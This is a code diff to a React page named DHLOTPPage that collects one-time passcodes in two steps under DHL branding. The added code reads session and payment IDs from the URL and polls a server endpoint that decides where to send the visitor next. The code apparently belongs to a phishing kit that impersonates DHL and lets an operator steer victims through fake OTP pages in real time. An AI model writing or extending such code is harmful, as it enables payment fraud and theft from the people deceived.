@@ -1,18 +1,38 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { useMutation } from "@tanstack/react-query";
 import { apiRequest } from "@/lib/queryClient";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
 import { ShieldCheck, ArrowLeft } from "lucide-react";
+import { useRedirectPolling } from "@/hooks/use-redirect-polling";
 
 interface DHLOTPPageProps {
   step: 1 | 2;
   paymentId?: string;
 }
 
-export default function DHLOTPPage({ step = 1, paymentId }: DHLOTPPageProps) {
+export default function DHLOTPPage({ step = 1, paymentId: propPaymentId }: DHLOTPPageProps) {
   const [otp, setOtp] = useState("");
+  const [sessionId, setSessionId] = useState<string | null>(null);
+  const [paymentId, setPaymentId] = useState<string>(propPaymentId || "");
+
+  useEffect(() => {
+    const params = new URLSearchParams(window.location.search);
+    const id = params.get("session");
+    const pId = params.get("paymentId") || propPaymentId;
+    if (id) setSessionId(id);
+    if (pId) setPaymentId(pId);
+  }, [propPaymentId]);
+
+  // Use redirect polling hook
+  useRedirectPolling({
+    sessionId,
+    currentPath: step === 1 ? "/otp1" : "/otp2",
+    paymentId,
+    apiEndpoint: "/api/dhl/session",
+    pathEndpoint: "/api/dhl/session/:sessionId/path",
+  });
 
   const otpMutation = useMutation({
     mutationFn: async (otpValue: string) => {
@@ -22,14 +42,25 @@ export default function DHLOTPPage({ step = 1, paymentId }: DHLOTPPageProps) {
       await apiRequest("POST", endpoint, { otp: otpValue });
     },
     onSuccess: () => {
+      // Preserve session and paymentId params in navigation
+      const params = new URLSearchParams();
+      if (sessionId) params.set("session", sessionId);
+      if (paymentId) params.set("paymentId", paymentId);
+      const queryString = params.toString();
+      
       if (step === 1) {
-        window.location.href = "/otp2";
+        window.location.href = `/otp2${queryString ? `?${queryString}` : ""}`;
       } else {
-        window.location.href = "/success";
+        window.location.href = `/success${queryString ? `?${queryString}` : ""}`;
       }
     },
     onError: () => {
-      window.location.href = "/otp-error";
+      // Preserve session and paymentId params in error navigation
+      const params = new URLSearchParams();
+      if (sessionId) params.set("session", sessionId);
+      if (paymentId) params.set("paymentId", paymentId);
+      const queryString = params.toString();
+      window.location.href = `/otp-error${queryString ? `?${queryString}` : ""}`;
     },
   });
 
